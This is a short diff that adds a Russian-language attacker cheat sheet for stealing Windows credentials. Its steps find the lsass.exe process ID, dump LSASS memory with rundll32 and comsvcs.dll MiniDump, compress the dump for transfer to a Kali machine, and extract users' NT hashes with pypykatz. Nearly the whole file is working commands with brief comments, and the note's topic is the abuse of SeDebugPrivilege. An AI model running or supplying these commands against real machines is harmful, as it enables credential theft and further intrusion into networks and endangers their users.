@@ -1,0 +1,11 @@
+опасная привилегия SeDebugPrivilege
+tasklist /fi "imagename eq lsass.exe" (смотрим PID процесса)
+#дампим lsass
+rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump 696
+C:\users\Public\lsass.dmp full
+# появляется файл lsass.dmp
+#также его можно заархивировать
+Compress-Archive -Path lsass.dmp -DestinationPath lsass.zip
+#чтобы перенести крупные файлы нужно поднять сервер
+#после скачивания на kali выгружаем NT hash пользаков
+pypykatz lsa minidump lsass.dmp
